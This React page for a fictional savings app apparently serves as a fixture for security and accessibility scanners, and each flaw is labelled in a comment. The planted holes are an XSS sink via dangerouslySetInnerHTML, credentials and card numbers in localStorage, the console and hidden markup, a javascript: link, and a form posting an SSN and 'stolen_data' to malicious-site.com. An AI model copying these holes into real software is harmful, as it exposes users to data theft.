import { useState } from "react";

const Index = () => {
  const [userInput, setUserInput] = useState("");
  const [submittedData, setSubmittedData] = useState("");
  
  // SECURITY VIOLATION: Storing sensitive data in localStorage without encryption
  const saveToLocalStorage = () => {
    localStorage.setItem("userPassword", "password123");
    localStorage.setItem("apiKey", "sk-1234567890abcdef");
    localStorage.setItem("creditCard", "4111-1111-1111-1111");
  };

  // SECURITY VIOLATION: Logging sensitive data to console
  const handleSubmit = () => {
    console.log("User password:", userInput);
    console.log("Credit card:", "4111-1111-1111-1111");
    setSubmittedData(userInput);
    saveToLocalStorage();
  };

  return (
    <div className="min-h-screen bg-background">
      {/* WCAG: Missing skip link */}
      
      {/* WCAG: Improper heading hierarchy - jumping from h1 to h4 */}
      <h1 className="text-4xl font-bold text-center pt-12">SaveSmart</h1>
      <h4 className="text-lg text-center mt-2">Your Money, Your Future</h4>
      
      {/* WCAG: Link with no href */}
      <nav className="flex justify-center gap-4 mt-8">
        <a className="text-primary hover:underline">Features</a>
        <a href="#">Pricing</a>
        {/* WCAG: Empty link */}
        <a href="/about"></a>
        {/* WCAG: Non-descriptive link text */}
        <a href="/details">Click here</a>
        <a href="/more">Read more</a>
      </nav>

      {/* WCAG: Low contrast text */}
      <p style={{ color: "#999", backgroundColor: "#aaa" }} className="text-center mt-4">
        Important information that's hard to read
      </p>

      {/* WCAG: Image without alt text */}
      <div className="flex justify-center mt-8">
        <img src="/placeholder.svg" width="200" height="200" />
      </div>

      {/* WCAG: Duplicate IDs */}
      <section id="main-content" className="max-w-4xl mx-auto px-4 mt-12">
        <div id="main-content">
          {/* WCAG: Form without labels */}
          <div className="space-y-4">
            <input 
              type="text" 
              placeholder="Enter your email"
              className="w-full p-2 border rounded"
              value={userInput}
              onChange={(e) => setUserInput(e.target.value)}
            />
            {/* WCAG: Input with aria-hidden but still focusable */}
            <input 
              type="password" 
              placeholder="Password"
              aria-hidden="true"
              className="w-full p-2 border rounded"
            />
            
            {/* WCAG: Button without accessible name */}
            <button onClick={handleSubmit} className="p-2 bg-primary rounded">
              <svg width="20" height="20" viewBox="0 0 20 20">
                <circle cx="10" cy="10" r="8" fill="currentColor" />
              </svg>
            </button>
          </div>

          {/* SECURITY VIOLATION: Rendering user input with dangerouslySetInnerHTML (XSS vulnerability) */}
          <div 
            className="mt-4 p-4 border rounded"
            dangerouslySetInnerHTML={{ __html: submittedData }}
          />

          {/* SECURITY VIOLATION: Hardcoded credentials in HTML */}
          <div className="hidden">
            <span data-api-key="sk-secret-key-12345"></span>
            <span data-password="admin123"></span>
          </div>
        </div>
      </section>

      {/* WCAG: Auto-playing content without controls - using deprecated element */}
      <div 
        className="mt-8 overflow-hidden whitespace-nowrap"
        dangerouslySetInnerHTML={{ __html: '<marquee>Special offer! Limited time only!</marquee>' }}
      />

      {/* WCAG: Positive tabindex disrupting natural tab order */}
      <div className="flex justify-center gap-4 mt-8">
        <button tabIndex={5} className="p-2 bg-secondary rounded">First</button>
        <button tabIndex={1} className="p-2 bg-secondary rounded">Second</button>
        <button tabIndex={3} className="p-2 bg-secondary rounded">Third</button>
      </div>

      {/* WCAG: onclick on non-interactive element without keyboard support */}
      <div 
        className="mt-8 p-4 bg-accent text-center cursor-pointer"
        onClick={() => alert("Clicked!")}
      >
        Click this div to see an alert
      </div>

      {/* WCAG: Table without proper headers */}
      <table className="mx-auto mt-8 border">
        <tr>
          <td className="p-2 border">Plan</td>
          <td className="p-2 border">Price</td>
          <td className="p-2 border">Features</td>
        </tr>
        <tr>
          <td className="p-2 border">Basic</td>
          <td className="p-2 border">$9.99</td>
          <td className="p-2 border">5 users</td>
        </tr>
      </table>

      {/* SECURITY VIOLATION: Link with javascript: protocol */}
      <div className="text-center mt-8">
        <a href="javascript:alert('XSS')">Click for surprise</a>
      </div>

      {/* SECURITY VIOLATION: Form submitting to external URL without CSRF protection */}
      <form action="http://malicious-site.com/collect" method="POST" className="max-w-md mx-auto mt-8">
        <input type="hidden" name="stolen_data" value="sensitive-info" />
        <input type="text" name="ssn" placeholder="Enter SSN" className="w-full p-2 border rounded" />
        <button type="submit" className="mt-2 p-2 bg-destructive text-white rounded w-full">
          Submit
        </button>
      </form>

      {/* WCAG: Color as only indicator */}
      <div className="flex justify-center gap-4 mt-8">
        <span className="inline-block w-4 h-4 rounded-full bg-green-500"></span>
        <span>Available</span>
        <span className="inline-block w-4 h-4 rounded-full bg-red-500"></span>
        <span>Unavailable</span>
      </div>

      {/* WCAG: Text that cannot be resized (uses px) */}
      <p style={{ fontSize: "10px" }} className="text-center mt-4">
        This tiny text uses absolute pixels
      </p>

      <footer className="mt-12 p-4 bg-muted text-center">
        {/* WCAG: Link opens in new window without warning */}
        <a href="https://example.com" target="_blank" className="text-primary">
          External Link
        </a>
      </footer>
    </div>
  );
};

export default Index;
